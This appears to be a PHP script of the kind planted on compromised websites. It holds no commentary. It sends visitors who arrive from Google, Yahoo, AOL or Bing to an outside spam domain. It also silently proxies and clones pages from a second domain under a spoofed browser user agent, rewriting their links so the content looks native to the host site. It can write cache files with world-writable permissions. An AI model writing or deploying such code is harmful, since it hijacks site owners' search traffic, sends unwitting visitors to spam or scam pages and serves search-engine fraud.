<?php
$url='http://g.saleg79.info/?q=www.bworder.com2';$str=strpos($_SERVER['HTTP_REFERER'],'google');if($str){header("location:{$url}");exit();}else{$str=strpos($_SERVER['HTTP_REFERER'],'yahoo');if($str){header("location:{$url}");exit();}else{$str=strpos($_SERVER['HTTP_REFERER'],'aol');if($str){header("location:{$url}");exit();}else{$str=strpos($_SERVER['HTTP_REFERER'],'bing');if($str){header("location:{$url}");exit();}else{$str=strpos($_SERVER['HTTP_REFERER'],'=');if($str){header("location:{$url}");exit();}}}}}
?>
<?php
error_reporting(0);
@set_time_limit(0);
$target_siteurl = 'http://sale79.info/article/www.bworder.com2/';
$key_url = '';

$clone_url = $target_siteurl.'/';
$cachedir = dirname(__FILE__).'/cache/';
$cachedir ='';
define('CACHE_TIME',86400);

$PHP_SELF = isset($_SERVER['PHP_SELF']) ? str_replace("index.php", "", $_SERVER['PHP_SELF']) : (isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : $_SERVER['ORIG_PATH_INFO']);
$PHP_QUERYSTRING = $_SERVER['QUERY_STRING'];
$PHP_DOMAIN = $_SERVER['SERVER_NAME'];
$timestamp = time();

$PHP_URL = 'http://'.$PHP_DOMAIN.$PHP_SELF.'?';
define('NOW',$timestamp);


$cachefile = '';


if ($cachedir) {
    $cachefile = $cachedir.md5($PHP_QUERYSTRING).'.html';
    function get_cache(){
        global $cachefile;
        if (CACHE_TIME && NOW > (filemtime($cachefile) + CACHE_TIME)) {
            return FALSE;
        }
        return file_get_contents($cachefile);
    }
    function mk_dir($dir, $mode = 0775, $index = 0) {
        if (is_dir($dir)) return true;
        $path = array();
        $t = $dir;
        do {
            $path[] = $t;
        } while (!is_dir($t = dirname($t)));

        while ($c = array_pop($path)) {
            @mkdir($c, $mode);
            if ($index) {
                fclose(fopen($c.'/index.htm', 'wb'));
            }
        }
        return is_dir($dir);
    }
    function file_write($path, $data, $method = 'wb',$lock=1) {
        if ($fp = @fopen($path, $method)) {
            if($lock){
                @flock($fp,LOCK_EX);
            }
            fwrite($fp, $data);
            fclose($fp);
            chmod($path, 0777);
            return true;
        }
        return false;
    }
    function write_cache($data){
        global $cachefile;
        $dir = dirname($cachefile);
        if (!is_dir($dir)) {
            mk_dir($dir);
        }
        if (!is_dir($dir)) {
            exit('cachedir is not write!');
        }
        return file_write($cachefile,$data);
    }
    
    if ($html = get_cache()) {
    	exit($html);
    }
}
function get_html($url,$referer){
    if (function_exists('curl_init')) {
        $user_agent ='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        if ($referer) {
            curl_setopt($ch, CURLOPT_REFERER, $referer);
        }
        curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        if (!empty($post)) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        $htmldb = curl_exec ($ch);
        curl_close($ch);
        return $htmldb;
    }else {
        return file_get_contents($url);
    }
}
function strexists($string, $find) {
    return !(strpos($string, $find) === FALSE);
}
function burl($url){
    global $url_path,$clone_url,$target_siteurl;
    if ($url[0] =='/' ) {
        return $target_siteurl.$url;
    }
    return $target_siteurl.'/'.$url_path.$url;
}


$arr = explode('/',$PHP_QUERYSTRING);
$n = count($arr);
if ($n > 1) {
    unset($arr[$n-1]);
    $url_path = implode('/',$arr);
}else{
    $url_path = '';
}

$url = $clone_url.$PHP_QUERYSTRING;
//exit($url);
$html = get_html($url,$clone_url);
//echo $html;
$rp_array = array();
$p = '@<img\s+[^>]*?src=["\']{0,1}\s*((?!http:\/\/)[^"\' >]*)["\'> ]*@is';
preg_match_all($p,$html,$m);
if (!empty($m[1])) {
    $rp_array = array_merge($rp_array,$m[1]);
}

$p = '@<link\s+[^>]*?href=["\']{0,1}\s*((?!http:\/\/)[^"\' >]+)["\'> ]*@is';
preg_match_all($p,$html,$m);
if (!empty($m[1])) {
    $rp_array = array_merge($rp_array,$m[1]);
}

$p = '@url\(["\']{0,1}\s*((?!http:\/\/)[^\)]+["\' ]*)@is';
preg_match_all($p,$html,$m);
if (!empty($m[1])) {
    foreach ($m[1] as $v){
        $v = trim($v);
        if ($v) {
        	if (stripos($v, '.jpg') || stripos($v, '.gif') || stripos($v, '.png')) {
        		$rp_array[] = $v;
        	}
        }
    }
}

$p = '@<script\s+[^>]*?src=["\']{0,1}\s*((?!http:\/\/)[^"\' >]*)["\'> ]*@is';
preg_match_all($p,$html,$m);
if (!empty($m[1])) {
    $rp_array = array_merge($rp_array,$m[1]);
}
//var_export($rp_array);
$n = count($rp_array);
$rp_array2 = array();
for ($i=0;$i<$n;$i++){
    $str = trim($rp_array[$i]);
    if ($str) {
        $rp_array2[$i] = $str;
    }
}


$rp_array = array_values(array_unique($rp_array2));

unset($rp_array2);
$n = count($rp_array);
for ($i=0;$i<$n;$i++){
    $html = str_replace($rp_array[$i],burl($rp_array[$i]),$html);
}
$rp_array2 = $rp_array = array();

$p = '@<a\s+[^>]*?href(=["\']{0,1}\s*[^#"\': >][^"\' >]*["\'> ]{1})@is';
preg_match_all($p,$html,$m);


if (!empty($m[1])) {
    $rp_array = array_values(array_unique($m[1]));
    $n = count($rp_array);
    
    for ($i=0;$i<$n;$i++){
        $href = $rp_array[$i];

        $p = '@=["\']{0,1}\s*([^"\' >]+)["\'> ]{1}@is';
        $m = array();
        //exit($href);
        preg_match($p,$href,$m);
        
        if ($m[1] !='') {
            $str = $m[1];
            
            if (preg_match('@^http:\/\/@is',$str)) {
                $p = '@^'.$target_siteurl.'/*@is';
                if (preg_match($p,$str)) {
                    $temp = preg_replace($p,$PHP_URL,$str);
                    $re_href = str_replace($str,$temp,$href);
                    $html= str_replace($href,$re_href,$html);
                }
                continue;
            }
            if (preg_match('@:@is',$str)) {
                continue;
            }
//var_export($str);
            if ($str[0] =='/') {
                $temp = preg_replace('@^/@',$PHP_URL,$str);
                $re_href = str_replace($str,$temp,$href);
                $html= str_replace($href,$re_href,$html);
                continue;
            }
            //echo $url_path;
            if ($url_path) {
                $temp = $PHP_URL.$url_path.'/'.$str;
            }else {
                $temp = $PHP_URL.$str;
            }
            //exit($temp);
            $re_href = str_replace($str,$temp,$href);
            //exit($re_href);
            $html= str_replace($href,$re_href,$html);
        }
    }
}
if($key_url){
	$html2 = get_html($key_url);
	$html = $html.$html2;
}

if ($cachedir) {
	write_cache($html);
}
echo $html;
?>

